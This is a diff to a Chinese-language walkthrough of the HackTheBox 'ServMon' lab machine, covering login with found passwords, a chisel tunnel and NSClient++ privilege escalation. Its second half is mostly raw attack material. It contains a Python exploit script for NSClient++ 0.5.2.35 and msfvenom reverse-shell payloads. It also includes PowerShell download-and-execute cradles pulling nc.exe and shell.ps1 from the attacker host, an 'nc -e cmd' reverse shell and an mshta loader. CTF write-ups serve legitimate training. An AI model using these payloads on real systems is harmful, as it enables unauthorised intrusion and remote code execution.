@@ -95,7 +95,7 @@ Nadine
 
 有点CTF的意思了。。。
 
-根据提示有一个secure folder存放了Nathan修改后的password，这个密码可以用来登录NVMS后台
+根据提示可能有一个secure folder存放了Nathan修改后的password，这个密码可以用来登录NVMS后台
 Nathan的桌面上有一个Passwords.txt文件
 
 
@@ -150,6 +150,186 @@ Gr4etN3w5w17hMySk1Pa5$
 ++++++++++  END  ++++++++++  
 ```
 
-现在我们找到了一个密码字典，根据ftp的提示，其中一个是
+现在我们找到了一个密码字典，根据ftp的提示，其中一个是Nathan的密码
 
-evil-winrm -u 'nathan' -p '1nsp3ctTh3Way2Mars!' -i 10.10.10.184
+用这些密码尝试登陆web后台，失败
+尝试用evil-winrm登陆Nathan的账号，失败
+尝试用evil-winrm登陆Nadine的账号，失败
+尝试用ssh登陆Nathan的账号，失败
+有点小崩溃。。
+
+最后ssh一个个遍历Nadine，成功了。。。
+
+这个故事告诉我们枚举很重要。。
+
+密码是：```L1k3B1gBut7s@W0rk```
+```
+ssh Nadine@10.10.10.184
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>whoami
+servmon\nadine
+
+```
+在nadine的桌面拿到user.txt
+
+# 提权
+
+查看所有本地的TCP连接
+```
+PS C:\Users\Nadine> netstat -ano|findstr TCP
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2728
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5448
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5060
+  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2708
+  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2708
+  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       5448
+  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       5448
+  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2708
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       488
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       924
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1348
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2192
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2424
+  TCP    10.10.10.184:22        10.10.14.16:51872      ESTABLISHED     2728
+  TCP    10.10.10.184:22        10.10.14.16:51886      ESTABLISHED     2728
+  TCP    10.10.10.184:139       0.0.0.0:0              LISTENING       4
+  TCP    10.10.10.184:49699     10.10.14.16:8000       TIME_WAIT       0
+  TCP    10.10.10.184:49704     10.10.14.16:8000       ESTABLISHED     5764
+  TCP    127.0.0.1:49674        127.0.0.1:49675        ESTABLISHED     5448
+  TCP    127.0.0.1:49675        127.0.0.1:49674        ESTABLISHED     5448
+  TCP    127.0.0.1:49676        127.0.0.1:49677        ESTABLISHED     5448
+  TCP    127.0.0.1:49677        127.0.0.1:49676        ESTABLISHED     5448
+  TCP    [::]:21                [::]:0                 LISTENING       2600
+  TCP    [::]:22                [::]:0                 LISTENING       2728
+  TCP    [::]:135               [::]:0                 LISTENING       880
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5666              [::]:0                 LISTENING       2708
+  TCP    [::]:49664             [::]:0                 LISTENING       632
+  TCP    [::]:49665             [::]:0                 LISTENING       488
+  TCP    [::]:49666             [::]:0                 LISTENING       924
+  TCP    [::]:49667             [::]:0                 LISTENING       1348
+  TCP    [::]:49668             [::]:0                 LISTENING       2192
+  TCP    [::]:49669             [::]:0                 LISTENING       624
+  TCP    [::]:49670             [::]:0                 LISTENING       2424
+
+```
+
+8443端口本地打开有一个NSClient++的页面，但是登陆的时候一直报```403 Your not allowed```
+
+可能是限制了本地IP登陆
+
+## 隧道连接服务
+
+我们用chisel做一个隧道
+
+把chisel.exe传到靶机
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8000/chisel.exe','C:\temp\chisel.exe')"
+
+kali开启监听
+> ./chisel server -p 8000 --reverse
+
+
+windows连接
+> .\chisel.exe client 10.10.14.16:8000 R:8443:localhost:8443
+
+
+现在浏览器打开```https://10.10.10.184:8443/```再输入密码，报```403 Invalid password```
+
+说明现在我们是允许登陆这个后台的
+
+所以密码是什么呢？
+
+点击```Forgotten password?```
+
+
+```
+NSClient++ password
+
+The NSClient++ password can be found by running:
+
+nscp web -- password --display
+
+or you can sett a new password:
+
+nscp web -- password --set new-password
+```
+显示我们用命令可以显示这个密码
+
+来到：```C:\Program Files\NSClient++```
+
+执行命令：```nscp web -- password --display```
+
+```
+nadine@SERVMON C:\>cd C:\Program Files\NSClient++
+
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+
+
+```
+
+登陆密码是：```ew2x6SsGTxjRwXOT```
+
+
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.16 lport=4444 > evil.bat
+
+
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8088/nc.exe','C:\temp\nc.exe')"
+
+
+
+
+```
+#!/usr/bin/python3
+#automated way of exploiting vulnerabale NSClient++ 0.5.2.35 for privilege escalation.
+#original exploit: https://www.exploit-db.com/exploits/46802
+import requests
+import argparse
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+parser = argparse.ArgumentParser(description='NSClient++ 0.5.2.35 - Privilege Escalation Script')
+parser.add_argument('command', help='command to execute on victim machine')
+parser.add_argument('host', help='host + port of the target. For example: https://192.168.0.100:443')
+parser.add_argument('password', help='password for the user of the application')
+
+args = parser.parse_args()
+
+response = requests.put(args.host+'/api/v1/scripts/ext/scripts/exploit1.bat', data=args.command, verify=False, auth=('admin', args.password))
+print(response)
+response = requests.get(args.host+'/api/v1/queries/exploit1/commands/execute?time=1m', verify=False, auth=('admin', args.password))
+print(response)
+```
+
+./exp2.py "C:\\Temp\\nc.exe " https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
+
+
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8088/shell.exe','C:\temp\shell.exe')"
+
+
+nc 10.10.14.16 4242 -e cmd
+
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.16:8088/shell.ps1')|iex"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8088/shell.ps1')"
+
+Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8088/shell.ps1')"
+
+
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16:8088/shell.ps1') | powershell -noprofile
+
+mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+
+
+
+msfvenom  --platform windows -p  cmd/windows/reverse_powershell lhost=10.10.14.16 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 -o shell.exe
